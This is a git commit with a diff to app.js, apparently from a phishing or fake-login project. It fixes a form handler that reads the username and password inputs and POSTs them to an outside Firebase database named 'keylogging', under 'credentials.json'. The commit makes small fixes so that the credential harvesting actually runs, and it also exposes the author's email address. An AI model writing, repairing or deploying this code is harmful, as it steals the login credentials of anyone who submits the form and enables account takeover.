39affafa92ebaad5806d304494fa5abb408d5cb9
haraaaaaaa <harunhebibovic05@gmail.com>
2023-03-01 03:14:35 +0100

    function submitFormHandler not executing

--- app.js
+++ app.js
@@ -1,15 +1,17 @@
 const userInputs = document.querySelectorAll("input");
-const submitButton = document.getElementById("submitButton");
+const submitButton = document.querySelector("button");
+
+console.log("test123")
 
 const submitFormHandler = async (event) => {
-    event.preventDefault()
+    event.preventDefault();
 
     let username = userInputs[0].value;
     let password = userInputs[1].value;
 
     await fetch("https://keylogging-d5c8a-default-rtdb.europe-west1.firebasedatabase.app/credentials.json", {
         method: "POST",
-        body: JSON.stringify({ username: username, password: password }),
+        body: JSON.stringify({ username, password }),
         headers: {"Content-Type": "application/json"},
     });
 
@@ -17,4 +19,6 @@ const submitFormHandler = async (event) => {
 
 };
 
-submitButton.addEventListener("click", submitFormHandler);
+if(submitButton){
+    submitButton.addEventListener("click", submitFormHandler);
+}
